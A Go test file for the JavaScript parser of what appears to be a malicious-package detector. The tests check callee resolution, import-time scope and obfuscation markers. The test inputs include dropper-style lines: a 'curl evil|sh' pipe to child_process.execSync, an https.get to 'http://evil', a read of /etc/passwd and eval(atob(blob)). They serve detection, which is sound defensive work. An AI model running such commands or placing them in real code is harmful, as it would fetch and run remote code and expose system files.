package node

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// parse is a test shorthand that fails on a parser error (the parser
// is lenient by contract, so this should essentially never fire — a
// firing means a panic-class bug, not malformed input).
func parse(t *testing.T, src string) *Module {
	t.Helper()
	m, err := Parse([]byte(src))
	require.NoError(t, err)
	require.NotNil(t, m)
	return m
}

// findCall returns the first call whose callee matches, or fails.
func findCall(t *testing.T, m *Module, callee string) Call {
	t.Helper()
	for _, c := range m.Calls {
		if c.Callee == callee {
			return c
		}
	}
	t.Fatalf("no call with callee %q; calls=%+v", callee, m.Calls)
	return Call{}
}

func hasCall(m *Module, callee string) bool {
	for _, c := range m.Calls {
		if c.Callee == callee {
			return true
		}
	}
	return false
}

// TestParse_DottedCalleeAndModuleScope: a fully-qualified call at the
// top level is module-scope (runs on require/import).
func TestParse_DottedCalleeAndModuleScope(t *testing.T) {
	t.Parallel()
	m := parse(t, "child_process.execSync('whoami');\n")
	c := findCall(t, m, "child_process.execSync")
	assert.True(t, c.ModuleScope, "a top-level call runs at import time")
	assert.Equal(t, "whoami", c.FirstArg,
		"a string-literal first arg resolves statically")
}

// TestParse_ScopeDiscrimination: a call inside a function/arrow/method
// body is NOT module-scope; a sibling top-level call (even inside a
// top-level if) is. Catalog detection is scope-independent; this
// drives ImportTimeCallSites specifically.
func TestParse_ScopeDiscrimination(t *testing.T) {
	t.Parallel()
	src := `
top.a();
if (cond) { top.b(); }
function f() { inside.c(); }
const g = () => { inside.d(); };
class K { m() { inside.e(); } }
`
	m := parse(t, src)
	assert.True(t, findCall(t, m, "top.a").ModuleScope)
	assert.True(t, findCall(t, m, "top.b").ModuleScope,
		"a top-level if block still runs on import")
	assert.False(t, findCall(t, m, "inside.c").ModuleScope,
		"function body does not run at import time")
	assert.False(t, findCall(t, m, "inside.d").ModuleScope,
		"arrow block body does not run at import time")
	assert.False(t, findCall(t, m, "inside.e").ModuleScope,
		"class method body does not run at import time")
}

// TestParse_RequireInlineChain: require('mod').method(args) — the
// dominant obfuscated-dropper shape — resolves to a <mod>.<method>
// callee so the catalog matches it.
func TestParse_RequireInlineChain(t *testing.T) {
	t.Parallel()
	m := parse(t, "require('child_process').execSync('curl evil|sh');\n")
	c := findCall(t, m, "child_process.execSync")
	assert.True(t, c.ModuleScope)
	assert.Equal(t, "curl evil|sh", c.FirstArg)
}

// TestParse_RequireAliasVariable: const cp = require('child_process');
// cp.exec(x) — variable-bound alias resolves to the module name.
func TestParse_RequireAliasVariable(t *testing.T) {
	t.Parallel()
	m := parse(t, "const cp = require('child_process');\ncp.exec(payload);\n")
	assert.True(t, hasCall(m, "child_process.exec"),
		"a require() bound to a const must rewrite that alias's calls "+
			"to the module name; calls=%+v", m.Calls)
}

// TestParse_RequireDestructured: const { execSync } =
// require('child_process'); execSync(x) — destructured binding maps
// the local name to <mod>.<name>.
func TestParse_RequireDestructured(t *testing.T) {
	t.Parallel()
	m := parse(t, "const { execSync } = require('child_process');\nexecSync('id');\n")
	assert.True(t, hasCall(m, "child_process.execSync"),
		"destructured require binding must resolve; calls=%+v", m.Calls)
}

// TestParse_ImportBindings: ESM import forms resolve to module-
// qualified callees the same way the require forms do.
func TestParse_ImportBindings(t *testing.T) {
	t.Parallel()
	src := `
import { execSync } from 'child_process';
import https from 'https';
import * as fs from 'fs';
execSync('id');
https.get('http://evil');
fs.readFileSync('/etc/passwd');
`
	m := parse(t, src)
	assert.True(t, hasCall(m, "child_process.execSync"))
	assert.True(t, hasCall(m, "https.get"))
	c := findCall(t, m, "fs.readFileSync")
	assert.Equal(t, "/etc/passwd", c.FirstArg)
}

// TestParse_EvalAndNewFunction: the code-from-data primitives are
// bare-name calls (eval) and a constructor (new Function). Both must
// surface as callees.
func TestParse_EvalAndNewFunction(t *testing.T) {
	t.Parallel()
	m := parse(t, "eval(atob(blob));\nnew Function('a', 'return a')();\n")
	assert.True(t, hasCall(m, "eval"), "calls=%+v", m.Calls)
	assert.True(t, hasCall(m, "atob"))
	assert.True(t, hasCall(m, "Function"),
		"new Function(...) is the dynamic-code constructor; the callee "+
			"must be Function so the catalog can match it")
}

// TestParse_XorAssignCounted: ^= is the XOR-deobfuscation loop
// primitive; count occurrences (parity with the Go/Python analyzers).
func TestParse_XorAssignCounted(t *testing.T) {
	t.Parallel()
	m := parse(t, "for (let i=0;i<n;i++){ out[i] ^= key[i % key.length]; }\nb ^= c;\n")
	assert.Equal(t, 2, m.XorAssigns)
}

// TestParse_OpaqueLiteralsAreNotCalls: a call spelled inside a string,
// template, or regex literal must not be recorded — the security
// property the lexer guarantees, asserted end-to-end at the parser.
func TestParse_OpaqueLiteralsAreNotCalls(t *testing.T) {
	t.Parallel()
	src := "const s = 'child_process.execSync(1)';\n" +
		"const re = /eval\\(x\\)/g;\n" +
		"const tpl = `${notReallyACall()}`;\n"
	m := parse(t, src)
	assert.False(t, hasCall(m, "child_process.execSync"))
	assert.False(t, hasCall(m, "eval"))
	assert.False(t, hasCall(m, "notReallyACall"),
		"code inside a template interpolation is a documented "+
			"conservative miss — it must NOT be counted")
}

// TestParse_LenientOnMalformed: adversarial/truncated input yields a
// best-effort partial Module, never an error or panic. Named subtests
// so a single failing case can be re-run via -run
// TestParse_LenientOnMalformed/<name>.
func TestParse_LenientOnMalformed(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		src  string
	}{
		{"unclosed function header", "function ("},
		{"triple equals sequence", "const = = =;"},
		{"unclosed require call", "require("},
		{"unbalanced punctuation soup", "})(){}{("},
		{"unterminated template interpolation", "`unterminated ${ "},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			m, err := Parse([]byte(tc.src))
			require.NoError(t, err)
			require.NotNil(t, m)
		})
	}
}
